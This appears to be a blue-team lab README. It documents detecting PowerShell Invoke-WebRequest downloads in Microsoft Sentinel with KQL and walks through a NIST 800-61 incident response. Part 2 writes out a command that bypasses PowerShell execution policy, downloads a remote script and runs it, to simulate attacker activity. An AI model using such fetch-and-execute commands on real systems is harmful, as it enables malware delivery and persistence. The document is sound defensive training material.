# Incident-Response-PowerShell-Suspicious-Web-Request-NIST-800-61
# Felipe Restrepo - Incident Response Project: PowerShell Suspicious Web Request
# Explanation
Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

When processes are executed/run on the local VM, logs will be forwarded to Microsoft Defender for Endpoint under the DeviceProcessEvents table. These logs are then forwarded to the Log Analytics Workspace being used by Microsoft Sentinel, our SIEM. Within Sentinel, we will define an alert to trigger when PowerShell is used to download a remote file from the internet. 

![Screenshot 2025-06-25 003037](https://github.com/user-attachments/assets/ef91ba7b-99fa-489b-84f2-de5439d8f486)

## 📌 Overview
This Microsoft Sentinel project demonstrates a real-world incident response scenario where PowerShell is abused by an attacker to download potentially malicious scripts using `Invoke-WebRequest`. It walks through every phase of the NIST 800-61 Incident Response Lifecycle and shows how to:

- Detect the suspicious behavior
- Automate alerting and incident generation
- Investigate and analyze
- Contain and recover
- Document findings and improve defenses

---

## 🔍 Step-by-Step Implementation

### ✅ Part 1: Create Alert Rule - PowerShell Suspicious Web Request

**Purpose:** Detect when PowerShell is used to download files using `Invoke-WebRequest`, signaling possible attacker activity.

**Rule Details:**
- **Name:** Felipe Restrepo - PowerShell Suspicious Web Request
- **Severity:** Medium
- **MITRE ATT&CK:**
  - T1071.001 – Web Protocols
  - T1105 – Ingress Tool Transfer
  - T1203 – Exploitation for Client Execution
  - T1041 – Exfiltration Over C2
- **Query Schedule:** Every 4 hours, looking back 24 hours
- **Suppression:** Enabled for 24 hours
- **Entity Mapping:**
  - Account → AccountName
  - Host → DeviceName
  - Process → ProcessCommandLine

**KQL Detection Query:**
```kql
let TargetDevice = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "invoke-WebRequest"
```

**Screenshot:** `screenshots/rule_creation_1.png`

---

### 🛑 Part 2: Trigger Alert & Create Incident

**Purpose:** Generate logs by executing PowerShell web requests, which will trigger the alert rule in Sentinel.

**PowerShell Commands to Run on VM:**
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

**Result:** Microsoft Sentinel triggers the scheduled query and creates an incident.

**Screenshot:** `screenshots/incident_triggered.png`

---

### 🔎 Part 3: Investigate and Analyze the Incident

**Actions Taken:**
1. Alert was triggered on `windows-target-1`.
2. Entity mappings showed the account and command line activity.
3. User claimed they had installed free software before event.
4. Defender for Endpoint showed:

**KQL to Confirm Execution of Scripts:**
```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```

**Screenshot:** `screenshots/incident_analysis.png`

**Summary of Detected Scripts:**
| Script | Description |
|--------|-------------|
| `portscan.ps1` | Simulates a port scan |
| `pwncrypt.ps1` | Simulates ransomware-like encryption |
| `eicar.ps1` | Triggers antivirus as a test |
| `exfiltratedata.ps1` | Simulates data exfiltration |

---

### 🔒 Part 4: Containment, Eradication, and Recovery

**Actions:**
- Isolated VM in Microsoft Defender for Endpoint (MDE)
- Ran antivirus scan
- Removed isolation after VM came back clean

**Screenshot:** `screenshots/incident_closure.png`

---

### 📘 Part 5: Post-Incident Activities

**Notes and Improvements:**
- Updated PowerShell policy to restrict use to admins only
- Enrolled user in advanced cybersecurity awareness training (via KnowBe4)

---

### 🧹 Part 6: Cleanup

**Actions:**
- Deleted the custom Analytics Rule
- Deleted the closed incident entry in Sentinel

**Screenshot:** `screenshots/cleanup.png`

⚠️ *Be careful to only delete your own rules and incidents.*

---

## 📌 Final Notes:
- This project is based on Felipe Restrepo's real-world detection and incident response case using Microsoft Sentinel.
- It emphasizes a full detection-to-resolution workflow with hands-on implementation of a MITRE-aligned use case.
- Ideal for security analyst portfolios or blue team practice labs.

---

### 📎 References
- Microsoft Sentinel documentation
- MITRE ATT&CK Framework
- Josh Madakor Cyber Range Scripts
- NIST 800-61: Computer Security Incident Handling Guide
